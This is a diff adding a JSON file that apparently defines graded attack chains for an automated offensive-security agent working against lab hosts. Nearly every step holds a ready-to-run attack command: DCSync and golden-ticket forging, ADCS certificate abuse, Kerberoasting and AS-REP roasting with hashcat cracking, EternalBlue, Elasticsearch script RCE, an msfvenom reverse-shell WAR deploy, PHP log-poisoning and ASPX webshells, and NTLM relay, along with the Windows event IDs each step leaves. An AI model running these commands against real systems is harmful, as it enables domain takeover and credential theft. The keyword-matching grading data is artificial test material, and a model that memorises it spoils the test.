@@ -1,0 +1,3195 @@
+{
+  "ad_dcsync_golden_ticket": [
+    {
+      "keywords": [
+        "secretsdump",
+        "dcsync",
+        "mimikatz",
+        "krbtgt",
+        "secretsdump.py",
+        "-just-dc",
+        "NTLM",
+        "just-dc-user"
+      ],
+      "output_keywords": [
+        "krbtgt",
+        "NTLM",
+        "Kerberos",
+        "::::",
+        "aad3b435",
+        "Administrator:500",
+        "Hash dump",
+        "SAM"
+      ],
+      "stealth_event_ids": [
+        4662
+      ],
+      "step": "dcsync",
+      "time_budget_s": 60,
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump portal.lab/Administrator:LabAdmin1!@$LAB_TARGET_DC -just-dc-user krbtgt"
+    },
+    {
+      "depends_on": [
+        "dcsync"
+      ],
+      "keywords": [
+        "golden",
+        "ticketer",
+        "kerberos::golden",
+        "forged",
+        "ticketer.py",
+        "-nthash",
+        "domain-sid",
+        "administrator"
+      ],
+      "output_keywords": [
+        "Saving ticket",
+        ".ccache",
+        "ticket",
+        "saved",
+        "Golden"
+      ],
+      "stealth_event_ids": [],
+      "step": "golden",
+      "time_budget_s": 30,
+      "tool": "execute_bash",
+      "tool_hint": "impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain portal.lab administrator"
+    },
+    {
+      "depends_on": [
+        "golden"
+      ],
+      "keywords": [
+        "klist",
+        "psexec",
+        "dir \\\\",
+        "whoami",
+        "KRB5CCNAME",
+        "psexec.py",
+        "-k",
+        "ccache",
+        "no-pass"
+      ],
+      "output_keywords": [
+        "nt authority\\system",
+        "NT AUTHORITY\\SYSTEM",
+        "C:\\Windows",
+        "Microsoft Windows",
+        "Administrator"
+      ],
+      "stealth_event_ids": [
+        4624
+      ],
+      "step": "verify",
+      "time_budget_s": 60,
+      "tool": "execute_bash",
+      "tool_hint": "export KRB5CCNAME=/tmp/administrator.ccache && impacket-psexec -k -no-pass portal.lab/administrator@$LAB_TARGET_DC"
+    },
+    {
+      "depends_on": [
+        "verify"
+      ],
+      "keywords": [
+        "diamond",
+        "skeleton",
+        "adminSDHolder",
+        "persistence",
+        "secretsdump",
+        "ntds.dit",
+        "DRSUAPI",
+        "NTDS",
+        "-k"
+      ],
+      "output_keywords": [
+        "NTDS",
+        "DRSUAPI",
+        "ntds.dit",
+        "Kerberos",
+        "::::",
+        "krbtgt"
+      ],
+      "stealth_event_ids": [
+        4662
+      ],
+      "step": "persist",
+      "time_budget_s": 120,
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump -k -no-pass portal.lab/administrator@$LAB_TARGET_DC"
+    }
+  ],
+  "ad_forest_trust_abuse": [
+    {
+      "keywords": [
+        "ldapsearch",
+        "BloodHound",
+        "domain_trusts",
+        "Get-ADTrust",
+        "trustedDomain",
+        "TrustType",
+        "direction"
+      ],
+      "output_keywords": [
+        "trust",
+        "domain",
+        "DIRECT_OUTBOUND",
+        "DIRECT_INBOUND",
+        "TrustType",
+        "Direction",
+        "Name"
+      ],
+      "step": "enum_trust",
+      "tool": "execute_bash",
+      "tool_hint": "ldapsearch -x -H ldap://$LAB_TARGET_DC -D 'Administrator@portal.lab' -w 'LabAdmin1!' -b 'DC=portal,DC=lab' '(objectClass=trustedDomain)' cn trustDirection trustType trustAttributes 2>&1 | head -40"
+    },
+    {
+      "keywords": [
+        "ExtraSids",
+        "kerberos::golden",
+        "ticketer",
+        "sid",
+        "extra-sid",
+        "ExtraSids",
+        "child domain",
+        "parent sid"
+      ],
+      "output_keywords": [
+        "Saving ticket",
+        ".ccache",
+        "ticket",
+        "ExtraSid",
+        "saved"
+      ],
+      "step": "sid_forge",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $CHILD_SID -extra-sid $PARENT_SID -domain $CHILD_DOMAIN trust_admin"
+    },
+    {
+      "keywords": [
+        "trust",
+        "partner",
+        "cross-forest",
+        "unconstrained",
+        "psexec.py",
+        "-k",
+        "parent domain"
+      ],
+      "output_keywords": [
+        "C:\\",
+        "SYSTEM",
+        "Microsoft Windows",
+        "Administrator",
+        "whoami"
+      ],
+      "step": "cross_forest",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-psexec -k -no-pass $PARENT_DOMAIN/trust_admin@$PARENT_DC"
+    },
+    {
+      "keywords": [
+        "secretsdump",
+        "dcsync",
+        "partner",
+        "domain",
+        "DRSUAPI",
+        "NTDS"
+      ],
+      "output_keywords": [
+        "NTDS",
+        "DRSUAPI",
+        "::::",
+        "krbtgt",
+        "Kerberos"
+      ],
+      "step": "dcsync",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump -k -no-pass $PARENT_DOMAIN/trust_admin@$PARENT_DC"
+    }
+  ],
+  "adcs_template_abuse": [
+    {
+      "keywords": [
+        "certipy",
+        "certify",
+        "find",
+        "ESC",
+        "vulnerable",
+        "certipy find",
+        "-vulnerable",
+        "template"
+      ],
+      "output_keywords": [
+        "ESC",
+        "Vulnerable",
+        "template",
+        "CA",
+        "Certificate",
+        "certipy",
+        "Enabled",
+        "Client Authentication"
+      ],
+      "step": "enum_templates",
+      "tool": "execute_bash",
+      "tool_hint": "certipy-ad find -u Administrator@$LAB_TARGET_DC -p LabAdmin1! -dc-ip $LAB_TARGET_DC -vulnerable -stdout"
+    },
+    {
+      "keywords": [
+        "certipy req",
+        "altname",
+        "upn",
+        "san",
+        "-upn",
+        "-out",
+        ".pfx",
+        "certipy req"
+      ],
+      "output_keywords": [
+        "Saved certificate",
+        ".pfx",
+        "Certificate",
+        "Request ID",
+        "Issued"
+      ],
+      "step": "esc1_exploit",
+      "tool": "execute_bash",
+      "tool_hint": "certipy-ad req -u Administrator@$LAB_TARGET_DC -p LabAdmin1! -dc-ip $LAB_TARGET_DC -ca portal-CA -template User -upn administrator@portal.lab -out admin.pfx"
+    },
+    {
+      "keywords": [
+        "certipy auth",
+        "pfx",
+        "pass-the-cert",
+        "kerberos",
+        "certipy auth",
+        "-pfx",
+        "ccache"
+      ],
+      "output_keywords": [
+        "Got hash",
+        "Got TGT",
+        ".ccache",
+        "NT:",
+        "LM:",
+        "Kerberos"
+      ],
+      "step": "ptt",
+      "tool": "execute_bash",
+      "tool_hint": "certipy-ad auth -pfx admin.pfx -dc-ip $LAB_TARGET_DC -domain portal.lab -username administrator"
+    },
+    {
+      "keywords": [
+        "secretsdump",
+        "dcsync",
+        "domain admin",
+        "-k",
+        "no-pass",
+        "hash",
+        "NTLM"
+      ],
+      "output_keywords": [
+        "krbtgt",
+        "NTLM",
+        "::::",
+        "SAM",
+        "DRSUAPI",
+        "Administrator:500"
+      ],
+      "step": "dcsync",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump -k -no-pass portal.lab/administrator@$LAB_TARGET_DC"
+    }
+  ],
+  "asrep_roasting": [
+    {
+      "keywords": [
+        "GetNPUsers",
+        "asrep",
+        "--no-pass",
+        "UF_DONT_REQUIRE_PREAUTH",
+        "Rubeus asreproast",
+        "invoke-asreproast",
+        "netexec --asreproast",
+        "crackmapexec --asreproast",
+        "GetNPUsers.py",
+        "-request",
+        "asrep.hashes",
+        "enumdomusers",
+        "rpcclient",
+        "users.txt",
+        "nxc",
+        "--asreproast"
+      ],
+      "output_keywords": [
+        "$krb5asrep$",
+        "krb5asrep$23$",
+        "AS-REP",
+        "asrep",
+        "user@",
+        "enumdomusers",
+        "svc_",
+        "Administrator"
+      ],
+      "stealth_event_ids": [
+        4768
+      ],
+      "step": "enum_no_preauth",
+      "time_budget_s": 120,
+      "tool": "execute_bash",
+      "tool_hint": "rpcclient -U '' -N $LAB_TARGET_DC -c 'enumdomusers' && impacket-GetNPUsers $LAB_TARGET_DC/ -usersfile /tmp/users.txt -dc-ip $LAB_TARGET_DC -format hashcat -outputfile /tmp/hashes.asreproast"
+    },
+    {
+      "keywords": [
+        "18200",
+        "krb5asrep",
+        "hash",
+        "$krb5asrep$",
+        "AS-REP",
+        "asrep.hashes",
+        "asreproast",
+        "krb5asrep"
+      ],
+      "output_keywords": [
+        "$krb5asrep$",
+        "krb5asrep$23$",
+        "18200"
+      ],
+      "stealth_event_ids": [],
+      "step": "capture",
+      "time_budget_s": 30,
+      "tool": "execute_bash",
+      "tool_hint": "cat /tmp/hashes.asreproast | grep krb5asrep"
+    },
+    {
+      "depends_on": [
+        "capture"
+      ],
+      "keywords": [
+        "hashcat",
+        "john",
+        "rockyou",
+        "wordlist",
+        "-m 18200",
+        "crack",
+        "password",
+        "18200"
+      ],
+      "output_keywords": [
+        "Cracked",
+        "Status.....: Cracked",
+        "Recovered",
+        "Session..........: hashcat",
+        "password ="
+      ],
+      "stealth_event_ids": [],
+      "step": "crack",
+      "time_budget_s": 300,
+      "tool": "execute_bash",
+      "tool_hint": "hashcat -m 18200 /tmp/hashes.asreproast /usr/share/wordlists/rockyou.txt --force"
+    }
+  ],
+  "bloodhound_ad_recon": [
+    {
+      "keywords": [
+        "bloodhound",
+        "sharphound",
+        "bloodhound-python",
+        "neo4j",
+        "-c All",
+        "--zip",
+        "AD recon",
+        "LDAP collect"
+      ],
+      "output_keywords": [
+        "Done!",
+        "computers",
+        "users",
+        "groups",
+        ".json",
+        ".zip",
+        "bloodhound",
+        "Collecting"
+      ],
+      "step": "collect",
+      "tool": "execute_bash",
+      "tool_hint": "bloodhound-python -u Administrator -p LabAdmin1! -d portal.lab -dc $LAB_TARGET_DC -c All --zip"
+    },
+    {
+      "keywords": [
+        "shortestPath",
+        "DOMAIN ADMINS",
+        "Owned",
+        "CanRDPTo",
+        "HasSession",
+        "cypher",
+        "BloodHound query",
+        "domain admin path",
+        "neo4j",
+        "7687",
+        "7474",
+        "command -v bloodhound",
+        "pip show bloodhound",
+        "bloodhound-python",
+        "find /usr",
+        "apt list",
+        "neo4j listeners"
+      ],
+      "output_keywords": [
+        "shortestPath",
+        "DOMAIN ADMINS",
+        "AdminTo",
+        "HasSession",
+        "DCSync",
+        "path"
+      ],
+      "step": "shortest_path",
+      "tool": "",
+      "tool_hint": "BloodHound: MATCH p=shortestPath((u:User)-[*1..]->(n:Group {name:'DOMAIN ADMINS@corp.local'})) RETURN p"
+    },
+    {
+      "keywords": [
+        "GenericAll",
+        "WriteDACL",
+        "WriteOwner",
+        "DCSync",
+        "net group",
+        "domain admins",
+        "ACL abuse",
+        "ACE",
+        "GenericWrite"
+      ],
+      "output_keywords": [
+        "GenericAll",
+        "WriteDACL",
+        "DCSync",
+        "Domain Admin",
+        "ACL",
+        "WriteOwner"
+      ],
+      "step": "exploit_path",
+      "tool": "execute_bash",
+      "tool_hint": "nxc ldap $LAB_TARGET_DC -u Administrator -p LabAdmin1! --groups 2>&1 | grep -i 'Domain Admins' | head -10"
+    },
+    {
+      "keywords": [
+        "secretsdump",
+        "dcsync",
+        "domain admin",
+        "NTLM",
+        "krbtgt",
+        "secretsdump.py"
+      ],
+      "output_keywords": [
+        "krbtgt",
+        "NTLM",
+        "::::",
+        "Administrator:500",
+        "SAM",
+        "Kerberos"
+      ],
+      "step": "dcsync",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump -just-dc portal.lab/Administrator:LabAdmin1!@$LAB_TARGET_DC"
+    }
+  ],
+  "chain_inherits": [
+    "kerberoasting"
+  ],
+  "es_script_rce": [
+    {
+      "keywords": [
+        "9200",
+        "elasticsearch",
+        "version",
+        "cluster",
+        "nodes"
+      ],
+      "output_keywords": [
+        "elasticsearch",
+        "version",
+        "cluster",
+        "9200",
+        "1.4"
+      ],
+      "step": "recon",
+      "success_indicators": [
+        "elasticsearch",
+        "9200"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -s http://$LAB_TARGET_META3_WIN:9200/ && curl -s http://$LAB_TARGET_META3_WIN:9200/_nodes?pretty | head -20"
+    },
+    {
+      "keywords": [
+        "_search",
+        "script",
+        "groovy",
+        "Runtime",
+        "exec",
+        "CVE-2014-3120",
+        "sandbox"
+      ],
+      "output_keywords": [
+        "uid=",
+        "root",
+        "exec",
+        "Runtime",
+        "script"
+      ],
+      "step": "exploit",
+      "success_indicators": [
+        "uid=",
+        "root"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -X POST 'http://$LAB_TARGET_META3_WIN:9200/_search' -d '{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"test\":{\"script\":\"import java.util.*;import java.io.*;return Runtime.getRuntime().exec(\\\"id\\\").getText();\"}}}' 2>&1"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "Runtime",
+        "exec",
+        "confirm",
+        "rce"
+      ],
+      "output_keywords": [
+        "whoami",
+        "root",
+        "nt authority",
+        "exec"
+      ],
+      "step": "confirm",
+      "success_indicators": [
+        "whoami",
+        "root",
+        "nt authority"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -X POST 'http://$LAB_TARGET_META3_WIN:9200/_search' -d '{\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"test\":{\"script\":\"import java.util.*;import java.io.*;return Runtime.getRuntime().exec(\\\"whoami\\\").getText();\"}}}' 2>&1"
+    }
+  ],
+  "eternalblue_ms17010": [
+    {
+      "keywords": [
+        "nmap",
+        "ms17-010",
+        "eternalblue",
+        "smb-vuln",
+        "445",
+        "nmap -p 445",
+        "smb-vuln-ms17-010",
+        "VULNERABLE"
+      ],
+      "output_keywords": [
+        "VULNERABLE",
+        "ms17-010",
+        "MS17-010",
+        "EternalBlue",
+        "CVE-2017-0144",
+        "445/tcp open"
+      ],
+      "step": "scan",
+      "tool": "execute_bash",
+      "tool_hint": "nmap -p 445 --script smb-vuln-ms17-010 $LAB_TARGET_DC"
+    },
+    {
+      "keywords": [
+        "eternalblue",
+        "ms17-010",
+        "exploit",
+        "AutoBlue",
+        "eternalblue_exploit",
+        "shellcode",
+        "eternal",
+        "exploit7.py"
+      ],
+      "output_keywords": [
+        "shellcode",
+        "exploit",
+        "sending",
+        "target",
+        "AutoBlue",
+        "buf",
+        "exploit7"
+      ],
+      "step": "exploit",
+      "tool": "execute_bash",
+      "tool_hint": "python3 /opt/AutoBlue-MS17-010/eternalblue_exploit7.py $LAB_TARGET_DC shellcode/sc_x64.bin"
+    }
+  ],
+  "ftp_backdoor": [
+    {
+      "keywords": [
+        "IIS",
+        "ftp",
+        "banner",
+        "version",
+        "21/tcp",
+        "nmap"
+      ],
+      "output_keywords": [
+        "Microsoft ftpd",
+        "21/tcp",
+        "open",
+        "FTP"
+      ],
+      "step": "banner",
+      "success_indicators": [
+        "21/tcp",
+        "open"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "nmap -p 21 -sV $LAB_TARGET_META3_WIN 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "curl",
+        "LAB_META3_USER",
+        "LAB_META3_PASS",
+        "ftp://",
+        "authenticate"
+      ],
+      "output_keywords": [
+        "Directory",
+        "ftp",
+        "200",
+        "226",
+        "drwx",
+        "-rw"
+      ],
+      "step": "authenticate",
+      "success_indicators": [
+        "Directory",
+        "drwx",
+        "-rw",
+        "226"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl --fail --silent --show-error --user \"$LAB_META3_USER:$LAB_META3_PASS\" ftp://$LAB_TARGET_META3_WIN/ 2>&1 | head -30"
+    }
+  ],
+  "glassfish_deploy": [
+    {
+      "keywords": [
+        "4848",
+        "glassfish",
+        "admin",
+        "console",
+        "login",
+        "glassfish admin"
+      ],
+      "output_keywords": [
+        "200",
+        "401",
+        "GlassFish",
+        "admin",
+        "login"
+      ],
+      "step": "recon",
+      "success_indicators": [
+        "GlassFish",
+        "200",
+        "401"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -s -o /dev/null -w '%{http_code}' http://$LAB_TARGET_META3_WIN:4848/ && curl -s http://$LAB_TARGET_META3_WIN:4848/ | head -20"
+    },
+    {
+      "keywords": [
+        "admin:admin",
+        "default",
+        "credentials",
+        "login",
+        "glassfish",
+        "4848",
+        "management"
+      ],
+      "output_keywords": [
+        "application",
+        "200",
+        "OK",
+        "admin",
+        "glassfish"
+      ],
+      "step": "creds",
+      "success_indicators": [
+        "200",
+        "application",
+        "OK"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -u admin:admin http://$LAB_TARGET_META3_WIN:4848/management/domain/applications/application 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "msfvenom",
+        "war",
+        "deploy",
+        "PUT",
+        "POST",
+        "shell.war",
+        "application"
+      ],
+      "output_keywords": [
+        "deployed",
+        "Deployed",
+        "successfully deployed",
+        "glassfish deploy",
+        "application.*war"
+      ],
+      "step": "deploy",
+      "success_indicators": [
+        "deployed",
+        "Deployed"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.50 LPORT=4444 -f war -o /tmp/shell.war && curl -u admin:admin -X POST -H 'Content-Type: application/octet-stream' --data-binary @/tmp/shell.war 'http://$LAB_TARGET_META3_WIN:4848/management/domain/applications/application'"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "shell",
+        "cmd=",
+        "rce",
+        "webshell",
+        "trigger",
+        "curl"
+      ],
+      "output_keywords": [
+        "root",
+        "nt authority",
+        "whoami",
+        "uid=",
+        "shell"
+      ],
+      "step": "rce",
+      "success_indicators": [
+        "root",
+        "nt authority",
+        "whoami"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl http://$LAB_TARGET_META3_WIN:8080/shell/shell.jsp?cmd=whoami 2>&1"
+    }
+  ],
+  "htb_lfi_log_poison": [
+    {
+      "keywords": [
+        "curl",
+        "etc/passwd",
+        "file=",
+        "include",
+        "lfi",
+        "path="
+      ],
+      "output_keywords": [
+        "root:x:",
+        "etc/passwd",
+        "nobody:",
+        "daemon:"
+      ],
+      "step": "lfi_confirm",
+      "success_indicators": [
+        "root:x:",
+        "etc/passwd"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_WEB:8080/lfi.php?file=../../../etc/passwd' 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "User-Agent",
+        "<?php",
+        "access.log",
+        "poison",
+        "inject",
+        "system(",
+        "curl -A"
+      ],
+      "output_keywords": [
+        "<?php",
+        "200",
+        "access.log",
+        "poisoned"
+      ],
+      "step": "log_poison",
+      "success_indicators": [
+        "200",
+        "<?php"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -A '<?php system($_GET[\"cmd\"]); ?>' 'http://$LAB_TARGET_WEB:8080/lfi.php' 2>&1"
+    },
+    {
+      "keywords": [
+        "cmd=",
+        "id",
+        "whoami",
+        "access.log",
+        "execute",
+        "rce",
+        "php system"
+      ],
+      "output_keywords": [
+        "uid=",
+        "www-data",
+        "root",
+        "id",
+        "whoami"
+      ],
+      "step": "rce",
+      "success_indicators": [
+        "uid=",
+        "www-data",
+        "root"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_WEB:8080/lfi.php?file=../../../var/log/apache2/access.log&cmd=id' 2>&1 | tail -5"
+    },
+    {
+      "keywords": [
+        "suid",
+        "sudo",
+        "find / -perm",
+        "-4000",
+        "linpeas",
+        "privesc",
+        "sudo -l"
+      ],
+      "output_keywords": [
+        "SUID",
+        "NOPASSWD",
+        "-rwsr",
+        "uid=0",
+        "/bin/bash",
+        "sudo: NOPASSWD"
+      ],
+      "step": "privesc",
+      "success_indicators": [
+        "NOPASSWD",
+        "SUID",
+        "uid=0"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "find / -perm -4000 -type f 2>/dev/null && sudo -l 2>&1"
+    }
+  ],
+  "htb_responder_chain": [
+    {
+      "keywords": [
+        "Responder.conf",
+        "SMB = Off",
+        "HTTP = Off",
+        "sed",
+        "config",
+        "responder"
+      ],
+      "output_keywords": [
+        "SMB",
+        "HTTP",
+        "Off",
+        "responder"
+      ],
+      "step": "config",
+      "success_indicators": [
+        "SMB",
+        "Off",
+        "HTTP"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf && sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf && grep -E '^(SMB|HTTP)' /etc/responder/Responder.conf"
+    },
+    {
+      "keywords": [
+        "responder",
+        "LLMNR",
+        "NBT-NS",
+        "poison",
+        "Listening",
+        "-I eth0",
+        "-wPF"
+      ],
+      "output_keywords": [
+        "Responder",
+        "LLMNR",
+        "NBT-NS",
+        "Listening",
+        "poisoner"
+      ],
+      "step": "poison",
+      "success_indicators": [
+        "Listening",
+        "Responder",
+        "LLMNR"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "responder -I eth0 -wPF 2>&1 &"
+    },
+    {
+      "keywords": [
+        "--gen-relay-list",
+        "targets.txt",
+        "signing",
+        "nxc smb",
+        "not required",
+        "disabled"
+      ],
+      "output_keywords": [
+        "targets.txt",
+        "signing",
+        "not required",
+        "disabled",
+        "SMB"
+      ],
+      "step": "relay_list",
+      "success_indicators": [
+        "targets.txt",
+        "not required",
+        "disabled"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "nxc smb 10.10.11.0/24 --gen-relay-list /tmp/targets.txt 2>&1 && cat /tmp/targets.txt"
+    },
+    {
+      "keywords": [
+        "ntlmrelayx",
+        "relay",
+        "-tf",
+        "-smb2support",
+        "socks",
+        "impacket-ntlmrelayx"
+      ],
+      "output_keywords": [
+        "relay",
+        "ntlmrelayx",
+        "socks",
+        "NTLM",
+        "session"
+      ],
+      "step": "relay",
+      "success_indicators": [
+        "socks",
+        "session",
+        "relay"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -socks 2>&1 &"
+    },
+    {
+      "keywords": [
+        "smbclient",
+        "psexec",
+        "shell",
+        "proxychains",
+        "relay",
+        "authenticated"
+      ],
+      "output_keywords": [
+        "smb",
+        "authenticated",
+        "shell",
+        "session",
+        "C$"
+      ],
+      "step": "confirm",
+      "success_indicators": [
+        "authenticated",
+        "C$",
+        "shell"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "proxychains smbclient //<relayed_host>/C$ -U 'Administrator' --no-pass 2>&1 | head -5"
+    }
+  ],
+  "htb_sqli_to_shell": [
+    {
+      "keywords": [
+        "'",
+        "--",
+        "1=1",
+        "error",
+        "syntax",
+        "sql",
+        "injection",
+        "OR 1=1"
+      ],
+      "output_keywords": [
+        "error",
+        "syntax",
+        "mysql",
+        "sql",
+        "admin",
+        "login"
+      ],
+      "step": "sqli_detect",
+      "success_indicators": [
+        "error",
+        "syntax",
+        "sql"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB/login.php?user=admin\\'' -- 2>&1 | head -5 && curl -s 'http://$LAB_TARGET_WEB/login.php?user=admin\\' OR 1=1--' 2>&1 | head -5"
+    },
+    {
+      "keywords": [
+        "ORDER BY",
+        "UNION SELECT",
+        "NULL",
+        "column",
+        "UNION ALL",
+        "concat"
+      ],
+      "output_keywords": [
+        "UNION",
+        "SELECT",
+        "column",
+        "ORDER",
+        "NULL"
+      ],
+      "step": "enum",
+      "success_indicators": [
+        "UNION",
+        "SELECT"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB/login.php?user=admin\\' ORDER BY 3--' 2>&1 | head -5 && curl -s 'http://$LAB_TARGET_WEB/login.php?user=admin\\' UNION SELECT 1,2,3--' 2>&1 | head -5"
+    },
+    {
+      "keywords": [
+        "username",
+        "password",
+        "users",
+        "table",
+        "dump",
+        "credentials",
+        "FROM"
+      ],
+      "output_keywords": [
+        "admin",
+        "password",
+        "hash",
+        "username",
+        "$2y$"
+      ],
+      "step": "dump",
+      "success_indicators": [
+        "admin",
+        "password",
+        "$2y$"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB/login.php?user=admin\\' UNION SELECT username,password,3 FROM users--' 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "upload",
+        "POST",
+        "file=@",
+        "shell.php",
+        "multipart",
+        "admin panel",
+        "bypass"
+      ],
+      "output_keywords": [
+        "uploaded",
+        "200",
+        "success",
+        "file",
+        "shell.php"
+      ],
+      "step": "upload",
+      "success_indicators": [
+        "uploaded",
+        "200",
+        "success"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -X POST -F 'file=@shell.php;type=image/jpeg' http://$LAB_TARGET_WEB/admin/upload 2>&1 | head -5"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "cmd=",
+        "shell.php",
+        "webshell",
+        "rce",
+        "reverse shell"
+      ],
+      "output_keywords": [
+        "www-data",
+        "root",
+        "uid=",
+        "whoami",
+        "shell"
+      ],
+      "step": "shell",
+      "success_indicators": [
+        "www-data",
+        "root",
+        "uid="
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_WEB/uploads/shell.php?cmd=whoami' 2>&1 | tail -3"
+    }
+  ],
+  "iis_webdav_scanner": [
+    {
+      "keywords": [
+        "shortname",
+        "IIS",
+        "webdav",
+        "nmap",
+        "80/tcp",
+        "iis-webdav",
+        "curl",
+        "http://",
+        ":80"
+      ],
+      "output_keywords": [
+        "WebDAV",
+        "IIS",
+        "80",
+        "Microsoft-IIS",
+        "Server:",
+        "http"
+      ],
+      "step": "shortname",
+      "success_indicators": [
+        "IIS",
+        "WebDAV",
+        "Microsoft-IIS"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -s -o /dev/null -w '%{http_code}\\n' http://$LAB_TARGET_META3_WIN:80/ && curl -s -I http://$LAB_TARGET_META3_WIN:80/ 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "davtest",
+        "cadaver",
+        "webdav",
+        "PUT",
+        "MOVE",
+        "MKCOL",
+        "upload"
+      ],
+      "output_keywords": [
+        "PUT",
+        "MKCOL",
+        "MOVE",
+        "webdav",
+        "upload",
+        "DavTest"
+      ],
+      "step": "webdav_enum",
+      "success_indicators": [
+        "PUT",
+        "MKCOL",
+        "DavTest"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "davtest -url http://$LAB_TARGET_META3_WIN/ 2>&1 && cadaver http://$LAB_TARGET_META3_WIN/ <<< 'ls'"
+    },
+    {
+      "keywords": [
+        "PUT",
+        "upload",
+        "aspx",
+        "asp",
+        "shell",
+        "MOVE",
+        "cadaver",
+        "curl -X PUT"
+      ],
+      "output_keywords": [
+        "200",
+        "201",
+        "uploaded",
+        "Created",
+        "PUT",
+        "aspx"
+      ],
+      "step": "upload",
+      "success_indicators": [
+        "200",
+        "201",
+        "Created"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -X PUT http://$LAB_TARGET_META3_WIN/shell.aspx -d '<%@ Page Language=\"C#\" %><%Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo(\"cmd.exe\",\"/c whoami\"){RedirectStandardOutput=true,UseShellExecute=false}}).Start() && Response.Write(StandardOutput.ReadToEnd())%>'"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "shell",
+        "cmd=",
+        "rce",
+        "aspx",
+        "execute"
+      ],
+      "output_keywords": [
+        "nt authority",
+        "iis",
+        "whoami",
+        "root",
+        "uid="
+      ],
+      "step": "rce",
+      "success_indicators": [
+        "nt authority",
+        "whoami",
+        "uid="
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl http://$LAB_TARGET_META3_WIN/shell.aspx 2>&1"
+    }
+  ],
+  "kerberoasting": [
+    {
+      "keywords": [
+        "nmap",
+        "nxc",
+        "netexec",
+        "crackmapexec",
+        "445",
+        "88",
+        "389",
+        "ldap",
+        "bloodhound",
+        "dnsenum",
+        "enum4linux",
+        "smbclient -L",
+        "smbclient -N",
+        "--shares"
+      ],
+      "output_keywords": [
+        "SMB",
+        "445",
+        "LDAP",
+        "389",
+        "signing",
+        "Domain:",
+        "shares",
+        "Sharename",
+        "domain name",
+        "NetBIOS",
+        "portal.lab",
+        "portal"
+      ],
+      "stealth_event_ids": [],
+      "step": "recon",
+      "success_indicators": [
+        "SMB",
+        "445",
+        "shares",
+        "Domain:",
+        "portal.lab"
+      ],
+      "time_budget_s": 60,
+      "tool": "execute_bash",
+      "tool_hint": "smbclient -L //$LAB_TARGET_DC/ -N && nxc smb $LAB_TARGET_DC -u '' -p '' --shares"
+    },
+    {
+      "fallback_techniques": [
+        "nxc smb $LAB_TARGET_DC -u Administrator -p 'LabAdmin1!' --kerberoasting"
+      ],
+      "keywords": [
+        "GetUserSPNs",
+        "kerberoast",
+        "--spn",
+        "spn",
+        "Rubeus",
+        "invoke-kerberoast",
+        "$krb5tgs$",
+        "krb5tgs",
+        "--kerberoast",
+        "Invoke-Kerberoast",
+        "impacket",
+        "request",
+        "GetUserSPNs.py",
+        "-request",
+        "outputfile",
+        "roast",
+        "nxc",
+        "--kerberoast"
+      ],
+      "output_keywords": [
+        "$krb5tgs$",
+        "krb5tgs$23$",
+        "ServicePrincipalName",
+        "svc_mssql",
+        "svc_iis",
+        "svc_backup",
+        "MSSQLSvc",
+        "HTTP/",
+        "backup/"
+      ],
+      "stealth_event_ids": [
+        4769
+      ],
+      "step": "kerberoast",
+      "success_indicators": [
+        "$krb5tgs$",
+        "krb5tgs$23$",
+        "ServicePrincipalName",
+        "svc_mssql"
+      ],
+      "time_budget_s": 120,
+      "tool": "execute_bash",
+      "tool_hint": "impacket-GetUserSPNs portal.lab/Administrator:LabAdmin1! -dc-ip $LAB_TARGET_DC -request -outputfile /tmp/hashes.kerberoast"
+    },
+    {
